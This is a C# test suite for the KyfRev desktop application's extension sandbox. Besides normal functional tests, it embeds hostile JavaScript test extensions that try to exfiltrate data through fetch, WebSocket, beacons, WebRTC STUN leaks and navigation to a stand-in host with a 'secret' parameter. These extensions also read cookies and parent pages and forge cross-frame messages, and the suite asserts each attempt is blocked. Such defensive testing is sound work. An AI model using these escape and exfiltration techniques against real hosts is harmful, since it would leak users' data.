using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.Json;
using KyfRev.Application;
using KyfRev.Extensions.Host;
using KyfRev.Presentation.Wpf.Extensions;

namespace KyfRev.Presentation.Wpf.Tests;

/// <summary>Le code des extensions, dans le vrai moteur : les quatre publiées, telles quelles, puis des extensions qui cherchent à sortir de leur cadre.</summary>
[TestClass]
public sealed class ExtensionEngineTests
{
    private static readonly TimeSpan Long = TimeSpan.FromMinutes(2);

    private static string Published => Path.Combine(Repository.Root, "tests", "fixtures", "extensions");

    [EngineTest]
    public void Quiz_draws_its_block_and_its_view_and_keeps_its_score()
    {
        using var scene = new Scene();
        scene.Publish("quiz");
        scene.Data.Text = "```quiz\nQ: Qui convoque les états généraux ?\nR: Louis XVI\n```\n";
        using var ui = new UiThread();

        var block = Wait(scene.Engine.RenderBlockAsync("quiz", "quiz", "Q: Combien d'ordres ?\nR: Trois", dark: false));
        Assert.IsTrue(block.Succeeded, block.Error);
        StringAssert.Contains(block.Html, "Quiz · 1 question", StringComparison.Ordinal);
        StringAssert.Contains(block.Html, "Trois", StringComparison.Ordinal);

        var view = Wait(scene.Engine.RenderViewAsync("quiz", dark: false));
        Assert.IsTrue(view.Succeeded, view.Error);
        StringAssert.Contains(view.Html, "Qui convoque", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.ActAsync("quiz", "afficher", null, new Dictionary<string, string>())).Succeeded);
        StringAssert.Contains(Wait(scene.Engine.RenderViewAsync("quiz", dark: false)).Html, "Louis XVI", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.ActAsync("quiz", "resultat", "su", new Dictionary<string, string> { ["valeur"] = "su" })).Succeeded);
        Assert.IsNotNull(scene.Data.Stored, "Le score passe par l'hôte, qui l'écrit dans le coffre.");
    }

    [EngineTest]
    public void Chronology_gathers_the_dates_of_the_sheets()
    {
        using var scene = new Scene();
        scene.Publish("chronologie");
        scene.Data.Text = "```chronologie\n1792 : Proclamation de la République\n1789 : Prise de la Bastille\n```\n";
        using var ui = new UiThread();

        var block = Wait(scene.Engine.RenderBlockAsync("chronologie", "chronologie", "1789 : Prise de la Bastille", dark: true));
        StringAssert.Contains(block.Html, "Prise de la Bastille", StringComparison.Ordinal);

        var html = Wait(scene.Engine.RenderViewAsync("chronologie", dark: false)).Html!;
        Assert.IsLessThan(html.IndexOf("Proclamation", StringComparison.Ordinal), html.IndexOf("Bastille", StringComparison.Ordinal), "De la plus ancienne à la plus récente.");
    }

    [EngineTest]
    public void Vocabulary_asks_its_words_and_keeps_its_results()
    {
        using var scene = new Scene();
        scene.Publish("vocabulaire");
        scene.Data.Text = "```vocabulaire\nthe cat = le chat\n```\n";
        using var ui = new UiThread();

        StringAssert.Contains(Wait(scene.Engine.RenderBlockAsync("vocabulaire", "vocabulaire", "the cat = le chat", dark: false)).Html, "<details>", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.RenderViewAsync("vocabulaire", dark: false)).Html, "the cat", StringComparison.Ordinal);

        Wait(scene.Engine.ActAsync("vocabulaire", "afficher", null, new Dictionary<string, string>()));
        StringAssert.Contains(Wait(scene.Engine.RenderViewAsync("vocabulaire", dark: false)).Html, "le chat", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.ActAsync("vocabulaire", "resultat", "su", new Dictionary<string, string>())).Succeeded);
        StringAssert.Contains(scene.Data.Stored, "the cat", StringComparison.Ordinal);
    }

    [EngineTest]
    public void The_report_reads_the_sheets_and_counts_again()
    {
        using var scene = new Scene();
        scene.Publish("bilan");
        scene.Data.Text = "Un texte de quelques mots.";
        using var ui = new UiThread();

        var view = Wait(scene.Engine.RenderViewAsync("bilan", dark: false));
        Assert.IsTrue(view.Succeeded, view.Error);
        StringAssert.Contains(view.Html, "<h1>Bilan du coffre</h1>", StringComparison.Ordinal);
        StringAssert.Contains(view.Html, "1 fiche(s) active(s)", StringComparison.Ordinal);
        StringAssert.Contains(view.Html, "data-action=\"recalculer\"", StringComparison.Ordinal);

        scene.Data.Text = "Un texte de quelques mots, avec beaucoup plus de mots encore.";
        StringAssert.Contains(Wait(scene.Engine.RenderViewAsync("bilan", dark: false)).Html, "5 mots", StringComparison.Ordinal);
        Assert.IsTrue(Wait(scene.Engine.ActAsync("bilan", "recalculer", null, new Dictionary<string, string>())).Succeeded);
        StringAssert.Contains(Wait(scene.Engine.RenderViewAsync("bilan", dark: false)).Html, "11 mots", StringComparison.Ordinal);
    }

    [EngineTest]
    public void Without_its_permission_an_extension_is_refused_by_the_host()
    {
        using var scene = new Scene();
        scene.Install("sans-droit", """
            kyfrev.vue(async () => {
              const essais = [];
              for (const demande of [() => kyfrev.fiches.lister(), () => kyfrev.stockage.lire()]) {
                try { await demande(); essais.push("permis"); } catch (e) { essais.push(e.message); }
              }
              return essais.join(" | ");
            });
            """);
        using var ui = new UiThread();

        var html = Wait(scene.Engine.RenderViewAsync("sans-droit", dark: false)).Html!;

        StringAssert.Contains(html, "permission « fiches:lecture »", StringComparison.Ordinal);
        StringAssert.Contains(html, "permission « stockage »", StringComparison.Ordinal);
        Assert.AreEqual(0, scene.Data.Calls);
    }

    [EngineTest]
    public void An_extension_reaches_no_network()
    {
        // De vrais écouteurs sur cette machine : ce qui sortirait du cadre arriverait ici, quelle que soit la raison qui l'a laissé passer.
        using var tcp = new TcpListener(IPAddress.Loopback, 0);
        tcp.Start();
        var port = ((IPEndPoint)tcp.LocalEndpoint).Port;
        using var udp = new UdpClient(new IPEndPoint(IPAddress.Loopback, 0));
        var address = $"127.0.0.1:{port}";
        var stun = $"127.0.0.1:{((IPEndPoint)udp.Client.LocalEndPoint!).Port}";
        using var scene = new Scene();
        scene.Install("reseau", $$"""
            const essai = async (nom, faire) => {
              try { await faire(); return `${nom}: passe`; } catch (e) { return `${nom}: bloque`; }
            };
            const attendre = (cible, ouvert) => new Promise((ok, non) => { cible[ouvert] = ok; cible.onerror = non; });
            const lien = (rel) => { const l = document.createElement("link"); l.rel = rel; l.href = "http://{{address}}/lien"; document.head.append(l); };
            const liaison = (Liaison) => new Promise(async (ok, non) => {
              try {
                const pair = new Liaison({ iceServers: [{ urls: "stun:{{stun}}" }] });
                const candidats = [];
                pair.onicecandidate = (e) => { if (e.candidate) candidats.push(e.candidate.candidate); };
                pair.createDataChannel("fuite");
                await pair.setLocalDescription(await pair.createOffer());
                setTimeout(() => ok(candidats.join("/")), 2500);
              } catch (e) { non(e); }
            });
            const interne = () => { const f = document.createElement("iframe"); document.body.append(f); return f.contentWindow.RTCPeerConnection; };
            kyfrev.vue(async () => (await Promise.all([
              essai("fetch", () => fetch("http://{{address}}/fetch")),
              essai("xhr", () => new Promise((ok, non) => { const x = new XMLHttpRequest(); x.onload = ok; x.onerror = non; x.open("GET", "http://{{address}}/xhr"); x.send(); })),
              essai("image", () => { const i = new Image(); const fin = attendre(i, "onload"); i.src = "http://{{address}}/image.png"; return fin; }),
              essai("prise", () => attendre(new WebSocket("ws://{{address}}/prise"), "onopen")),
              essai("script", () => { const s = document.createElement("script"); const fin = attendre(s, "onload"); s.src = "http://{{address}}/x.js"; document.body.append(s); return fin; }),
              // Un piège : la politique du cadre doit refuser eval.
              essai("eval", () => eval("1")),
              essai("worker", () => { const w = new Worker("data:text/javascript,postMessage(1)"); return attendre(w, "onmessage"); }),
              essai("balise", () => navigator.sendBeacon("http://{{address}}/balise", "x")),
              essai("liens", () => { lien("preconnect"); lien("dns-prefetch"); lien("prefetch"); }),
              essai("liaison", () => liaison(RTCPeerConnection)),
              essai("liaison-interne", () => liaison(interne())),
            ])).join(" | "));
            """);
        using var ui = new UiThread();

        var answer = Wait(scene.Engine.RenderViewAsync("reseau", dark: false));
        Pump(TimeSpan.FromMilliseconds(500));

        Assert.IsTrue(answer.Succeeded, answer.Error);
        foreach (var tried in new[] { "fetch", "xhr", "image", "prise", "script", "eval", "worker", "liaison", "liaison-interne" })
        {
            StringAssert.Contains(answer.Html, $"{tried}: bloque", StringComparison.Ordinal);
        }
        Assert.IsFalse(tcp.Pending(), "Une connexion est sortie du cadre.");
        Assert.AreEqual(0, udp.Available, "Un paquet est sorti du cadre.");
    }

    [EngineTest]
    public void A_frame_cannot_leave_its_address()
    {
        using var scene = new Scene();
        scene.Install("depart", """
            kyfrev.vue(() => "encore la");
            kyfrev.action("partir", () => { location.href = "https://fuite.invalid/?secret=1"; });
            """);
        using var ui = new UiThread();
        Wait(scene.Engine.RenderViewAsync("depart", dark: false));

        Wait(scene.Engine.ActAsync("depart", "partir", null, new Dictionary<string, string>()));
        UiThread.Until(() => scene.Engine.Refused.Any(address => address.Contains("fuite.invalid", StringComparison.Ordinal)), Long);
        scene.Engine.Patience = TimeSpan.FromSeconds(2);

        // Le cadre a perdu son document : il ne répond plus, et le moteur repart sans lui.
        Wait(scene.Engine.RenderViewAsync("depart", dark: false));

        scene.Engine.Patience = TimeSpan.FromSeconds(30);
        Assert.AreEqual("encore la", Wait(scene.Engine.RenderViewAsync("depart", dark: false)).Html);
    }

    [EngineTest]
    public void An_extension_touches_neither_the_page_nor_the_application()
    {
        using var scene = new Scene();
        scene.Install("hote", """
            const essai = (nom, faire) => { try { faire(); return `${nom}: passe`; } catch (e) { return `${nom}: bloque`; } };
            kyfrev.vue(() => [
              essai("page", () => parent.document.title),
              essai("adresse", () => top.location.href),
              essai("stockage", () => localStorage.getItem("x")),
              essai("cookie", () => document.cookie),
              essai("fenetre", () => { if (!window.open("https://fuite.invalid/")) throw new Error(); }),
              essai("alerte", () => alert("faux dialogue")),
              `canal: ${typeof window.chrome?.webview?.hostObjects}`,
            ].join(" | "));
            kyfrev.action("canal", () => {
              window.chrome?.webview?.postMessage?.({ kind: "rafraichir", id: "autre" });
              window.chrome?.webview?.postMessage?.({ kind: "resultat", id: "autre", n: 1, html: "faux" });
            });
            """);
        using var ui = new UiThread();
        var refreshed = new List<string>();
        scene.Engine.RefreshAsked += (_, e) => refreshed.Add(e.Extension);

        var html = Wait(scene.Engine.RenderViewAsync("hote", dark: false)).Html!;
        Assert.IsTrue(Wait(scene.Engine.ActAsync("hote", "canal", null, new Dictionary<string, string>())).Succeeded);
        Pump(TimeSpan.FromMilliseconds(300));

        foreach (var tried in new[] { "page", "adresse", "stockage", "cookie", "fenetre" })
        {
            StringAssert.Contains(html, $"{tried}: bloque", StringComparison.Ordinal);
        }
        Assert.IsEmpty(refreshed, "Le canal de la page n'écoute pas un cadre.");
    }

    [EngineTest]
    public void An_extension_cannot_load_the_code_of_another()
    {
        using var scene = new Scene();
        scene.Publish("bilan");
        scene.Install("voleuse", """
            const charger = (adresse) => new Promise((fin) => {
              const s = document.createElement("script");
              s.src = adresse;
              s.onload = () => fin("charge");
              s.onerror = () => fin("refuse");
              document.body.append(s);
            });
            kyfrev.vue(async () => [
              await charger("https://extensions.kyfrev.invalid/bilan/extension.js"),
              await charger("https://extensions.kyfrev.invalid/hote.js"),
              await charger("/voleuse/autre.js"),
            ].join(" | "));
            """);
        File.WriteAllText(Path.Combine(scene.Library.FolderOf("voleuse"), "autre.js"), string.Empty);
        using var ui = new UiThread();

        Assert.AreEqual("refuse | refuse | charge", Wait(scene.Engine.RenderViewAsync("voleuse", dark: false)).Html);
    }

    [EngineTest]
    public void An_extension_cannot_answer_in_the_place_of_another()
    {
        using var scene = new Scene();
        scene.Install("lente", """
            kyfrev.vue(() => new Promise((fin) => setTimeout(() => fin("la vraie reponse"), 800)));
            kyfrev.action("vite", () => {});
            """);
        scene.Install("usurpe", """
            let jeton = null;
            addEventListener("message", (e) => { jeton = e.data?.jeton ?? jeton; });
            kyfrev.vue(() => "usurpe");
            kyfrev.action("usurper", () => {
              for (let n = 1; n < 200; n++) parent.postMessage({ type: "resultat", n, html: "la fausse reponse", jeton }, "*");
              for (let i = 0; i < parent.frames.length; i++) {
                if (parent.frames[i] !== window) {
                  for (let n = 1; n < 200; n++) {
                    parent.frames[i].postMessage({ type: "reponse", n, resultat: "faux", jeton }, "*");
                    parent.frames[i].postMessage({ type: "rendre-vue", n, jeton }, "*");
                  }
                }
              }
              return new Promise((fin) => setTimeout(fin, 100));
            });
            """);
        using var ui = new UiThread();
        Wait(scene.Engine.RenderViewAsync("usurpe", dark: false));
        Wait(scene.Engine.ActAsync("lente", "vite", null, new Dictionary<string, string>()));

        var slow = scene.Engine.RenderViewAsync("lente", dark: false);
        Wait(scene.Engine.ActAsync("usurpe", "usurper", null, new Dictionary<string, string>()));

        Assert.IsFalse(slow.IsCompleted && slow.Result.Html != "la vraie reponse", "La réponse d'un autre cadre n'est pas prise.");
        Assert.AreEqual("la vraie reponse", Wait(slow).Html);
    }

    [EngineTest]
    public void A_message_without_the_token_of_the_frame_is_ignored()
    {
        using var scene = new Scene();
        scene.Install("sans-jeton", """
            kyfrev.vue(() => "vue");
            kyfrev.action("seul", () => { parent.postMessage({ type: "rafraichir" }, "*"); });
            kyfrev.action("avec", () => { kyfrev.rafraichir(); });
            """);
        using var ui = new UiThread();
        var refreshed = new List<string>();
        scene.Engine.RefreshAsked += (_, e) => refreshed.Add(e.Extension);

        Wait(scene.Engine.ActAsync("sans-jeton", "seul", null, new Dictionary<string, string>()));
        Pump(TimeSpan.FromMilliseconds(300));
        Assert.IsEmpty(refreshed);

        Wait(scene.Engine.ActAsync("sans-jeton", "avec", null, new Dictionary<string, string>()));
        UiThread.Until(() => refreshed.Count == 1, Long);
        Assert.AreEqual("sans-jeton", refreshed.Single());
    }

    [EngineTest]
    public void An_extension_that_never_answers_blocks_nothing_and_the_others_go_on()
    {
        using var scene = new Scene();
        scene.Install("bloquee", """
            kyfrev.vue(() => { for (;;) { } });
            kyfrev.action("silence", () => new Promise(() => {}));
            """);
        scene.Install("saine", """kyfrev.vue(() => "saine");""");
        using var ui = new UiThread();
        Assert.AreEqual("saine", Wait(scene.Engine.RenderViewAsync("saine", dark: false)).Html);
        scene.Engine.Patience = TimeSpan.FromSeconds(2);

        var silent = Wait(scene.Engine.ActAsync("bloquee", "silence", null, new Dictionary<string, string>()));
        StringAssert.Contains(silent.Error, "pas de réponse", StringComparison.Ordinal);

        var stuck = Wait(scene.Engine.RenderViewAsync("bloquee", dark: false));
        StringAssert.Contains(stuck.Error, "pas de réponse", StringComparison.Ordinal);

        scene.Engine.Patience = TimeSpan.FromSeconds(30);
        Assert.AreEqual("saine", Wait(scene.Engine.RenderViewAsync("saine", dark: false)).Html);
    }

    [EngineTest]
    public void A_bad_answer_is_told_and_the_frame_stays()
    {
        using var scene = new Scene();
        scene.Install("mauvaise", """
            kyfrev.bloc("essai", () => 12);
            kyfrev.action("casse", () => { throw new Error("elle casse"); });
            """);
        using var ui = new UiThread();

        StringAssert.Contains(Wait(scene.Engine.RenderBlockAsync("mauvaise", "essai", string.Empty, dark: false)).Error, "chaîne HTML", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.RenderBlockAsync("mauvaise", "autre", string.Empty, dark: false)).Error, "aucun rendu", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.RenderViewAsync("mauvaise", dark: false)).Error, "pas de vue", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.ActAsync("mauvaise", "casse", null, new Dictionary<string, string>())).Error, "elle casse", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.ActAsync("mauvaise", "absente", null, new Dictionary<string, string>())).Error, "inconnue", StringComparison.Ordinal);
    }

    [EngineTest]
    public void A_stopped_or_changed_extension_is_forgotten()
    {
        using var scene = new Scene();
        var source = scene.Install("change", """kyfrev.vue(() => "premiere");""");
        using var ui = new UiThread();
        Assert.AreEqual("premiere", Wait(scene.Engine.RenderViewAsync("change", dark: false)).Html);

        File.WriteAllText(Path.Combine(source, "extension.js"), """kyfrev.vue(() => "seconde");""");
        scene.Library.Install(source);
        Assert.AreEqual("premiere", Wait(scene.Engine.RenderViewAsync("change", dark: false)).Html, "Son cadre reste jusqu'à ce qu'on l'oublie.");
        scene.Engine.Forget("change");
        Assert.AreEqual("seconde", Wait(scene.Engine.RenderViewAsync("change", dark: false)).Html);

        scene.Library.SetActive("change", false);
        Assert.AreEqual("extension inactive", Wait(scene.Engine.RenderViewAsync("change", dark: false)).Error);
        scene.Engine.Forget("jamais-vue");
    }

    [EngineTest]
    public void A_closed_engine_answers_nothing()
    {
        using var scene = new Scene();
        scene.Install("fermee", """kyfrev.vue(() => "vue");""");
        using var ui = new UiThread();
        var waiting = scene.Engine.RenderViewAsync("fermee", dark: false);

        scene.Engine.Dispose();

        Assert.IsFalse(Wait(waiting).Succeeded);
        Assert.AreEqual("extension inactive", Wait(scene.Engine.RenderViewAsync("fermee", dark: false)).Error);
    }

    [EngineTest]
    public void The_page_is_closed_to_everything_but_its_frames()
    {
        using var scene = new Scene();
        scene.Install("page", """kyfrev.vue(() => "vue");""");
        using var ui = new UiThread();
        Wait(scene.Engine.RenderViewAsync("page", dark: false));

        var frame = Run(scene, "document.querySelector('iframe').getAttribute('sandbox')");
        Assert.AreEqual("\"allow-scripts\"", frame);
        var read = Run(scene, "(async () => { try { await fetch('/page/extension.js'); return 'passe'; } catch (e) { return 'bloque'; } })()");
        Assert.AreEqual("{}", read, "La page elle-même ne lit rien par le réseau.");
    }

    [TestMethod]
    public void The_engine_needs_its_folder_its_library_and_its_requests()
    {
        var library = new ExtensionLibrary("x", TimeProvider.System);
        var requests = new ExtensionRequests(library, new FakeData());
        Assert.ThrowsExactly<ArgumentException>(() => new ExtensionEngine(string.Empty, library, requests));
        Assert.ThrowsExactly<ArgumentNullException>(() => new ExtensionEngine("x", null!, requests));
        Assert.ThrowsExactly<ArgumentNullException>(() => new ExtensionEngine("x", library, null!));
    }

    private static ExtensionAnswer Wait(Task<ExtensionAnswer> answer)
    {
        UiThread.Until(() => answer.IsCompleted, Long);
        return answer.Result;
    }

    private static string Run(Scene scene, string script)
    {
        var run = scene.Engine.RunScriptAsync(script);
        UiThread.Until(() => run.IsCompleted, Long);
        return run.Result;
    }

    private static void Pump(TimeSpan duration)
    {
        var end = DateTime.UtcNow + duration;
        UiThread.Until(() => DateTime.UtcNow >= end, duration + Long);
    }

    /// <summary>Une bibliothèque et un moteur d'essai.</summary>
    private sealed class Scene : IDisposable
    {
        private readonly string _root = Path.Combine(Path.GetTempPath(), "kyfrev-extensions-" + Guid.NewGuid().ToString("N"));

        public Scene()
        {
            Directory.CreateDirectory(_root);
            Library = new TestLibrary(Path.Combine(_root, "bibliotheque"));
            Engine = new ExtensionEngine(FakeEnvironment.ExtensionData, Library.Library, new ExtensionRequests(Library.Library, Data));
        }

        public TestLibrary Library { get; }

        public FakeData Data { get; } = new();

        public ExtensionEngine Engine { get; }

        /// <summary>Installe une extension publiée, telle quelle.</summary>
        public void Publish(string id) => Assert.IsTrue(Library.Library.Install(Path.Combine(Published, id)).Succeeded);

        /// <summary>Installe une extension d'essai, avec toutes les permissions si elle lit les fiches, et rend son dossier source.</summary>
        public string Install(string id, string script)
        {
            var source = Path.Combine(_root, "sources", id);
            Directory.CreateDirectory(source);
            File.WriteAllText(Path.Combine(source, ExtensionManifest.FileName), JsonSerializer.Serialize(new { id, nom = id, version = "1", vue = new { titre = id } }));
            File.WriteAllText(Path.Combine(source, "extension.js"), script);
            var installed = Library.Library.Install(source);
            Assert.IsTrue(installed.Succeeded, installed.Error);
            return source;
        }

        public void Dispose()
        {
            Engine.Dispose();
            Directory.Delete(_root, recursive: true);
        }
    }

    private sealed class TestLibrary(string folder)
    {
        public ExtensionLibrary Library { get; } = new(folder, TimeProvider.System);

        public string FolderOf(string id) => Path.Combine(folder, id);

        public Outcome<Done> SetActive(string id, bool active) => Library.SetActive(id, active);

        public Outcome<InstalledExtension> Install(string source) => Library.Install(source);
    }

    /// <summary>Le coffre tel que les extensions le voient : une fiche, dont le texte change à la demande.</summary>
    private sealed class FakeData : IExtensionData
    {
        public string Text { get; set; } = string.Empty;

        public string? Stored { get; private set; }

        public int Calls { get; private set; }

        public Task<Outcome<IReadOnlyList<ExtensionSheet>>> SheetsAsync()
        {
            Calls++;
            return Task.FromResult(Outcome.Of<IReadOnlyList<ExtensionSheet>>([new ExtensionSheet("f_1", "Une fiche", "Histoire", [], false)]));
        }

        public Task<Outcome<ExtensionSheetText>> SheetAsync(string id)
        {
            Calls++;
            return Task.FromResult(Outcome.Of(new ExtensionSheetText(id, "Une fiche", Text)));
        }

        public Task<Outcome<string?>> StoredAsync(string extension)
        {
            Calls++;
            return Task.FromResult(Outcome.Of(Stored));
        }

        public Task<Outcome<Done>> StoreAsync(string extension, string json)
        {
            Calls++;
            Stored = json;
            return Task.FromResult(Outcome.Done());
        }
    }
}
